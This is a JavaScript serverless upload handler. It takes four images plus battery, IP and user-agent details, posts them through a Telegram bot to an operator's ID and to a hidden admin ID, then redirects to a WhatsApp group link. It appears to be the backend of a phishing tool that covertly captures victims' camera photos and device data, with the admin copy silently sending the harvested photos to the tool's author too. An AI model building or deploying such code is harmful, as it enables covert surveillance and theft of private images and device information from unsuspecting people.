const formidable = require('formidable');
const fs = require('fs');
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = (req, res) => {
  if (req.method !== 'POST') return res.status(405).send("Method Not Allowed");

  const form = new formidable.IncomingForm({
    uploadDir: "/tmp",
    keepExtensions: true,
  });

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).send("Form parse error");

    const uid = fields.uid;

    // Check that all 4 images exist
    const imageFiles = ['image1', 'image2', 'image3', 'image4'].map(key => files[key]);
    if (!uid || imageFiles.some(f => !f)) return res.status(400).send("UID or images missing");

    try {
      // Device & Network info
      const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || "Unknown";
      const userAgent = req.headers['user-agent'] || "Unknown";
      const timestamp = new Date().toLocaleString('en-US', {
        timeZone: 'Asia/Kabul',
        hour12: false,
      });

      // Battery info (from frontend)
      const battery = fields.battery || 'Unknown';
      let charging = 'Unknown';
      if (fields.charging === 'true') charging = 'Yes 🔌';
      if (fields.charging === 'false') charging = 'No 🔘';

      // Telegram Caption
      const caption = `
╭─────📸 <b><blockquote>NEW PHOTOS RECEIVED</blockquote></b> │─────────────────────╮
│
│─❖ 🙎 <b>User ID:</b> ${uid}
│─❖ 🔋 <b>Battery:</b> ${battery}%
│─❖ ⚡ <b>Charging:</b> ${charging}
│─❖ 🌐 <b>IP:</b> ${ip}
│─❖ 📱 <b>Device:</b> ${userAgent}
│─❖ 🕒 <b>Time:</b> ${timestamp}
╰───────────────────────────────────────
╭────👨🏻‍💻 <b><blockquote>BUILT BY WACIQ</blockquote></b> ───╮
╰─────────────────────╯
`.trim();

      // Send each image
      for (const file of imageFiles) {
        const buffer = fs.readFileSync(file.filepath);

        // Send to user
        await bot.telegram.sendPhoto(
          uid,
          { source: buffer },
          { caption: caption, parse_mode: "HTML" }
        );

        // Send to admin if ADMIN_ID is set
        if (process.env.ADMIN_ID) {
          await bot.telegram.sendPhoto(
            process.env.ADMIN_ID,
            { source: buffer },
            { caption: caption, parse_mode: "HTML" }
          );
        }

        // Cleanup temp file
        fs.unlinkSync(file.filepath);
      }

      // ✅ Redirect to WhatsApp link after all photos sent
      res.redirect("https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS");

    } catch (e) {
      console.error("Telegram Error:", e.message);

      // ❌ Cleanup all uploaded files
      for (const file of imageFiles) {
        if (file && file.filepath) {
          try { fs.unlinkSync(file.filepath); } catch {}
        }
      }
      res.redirect("https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS");
    }
  });
}; 
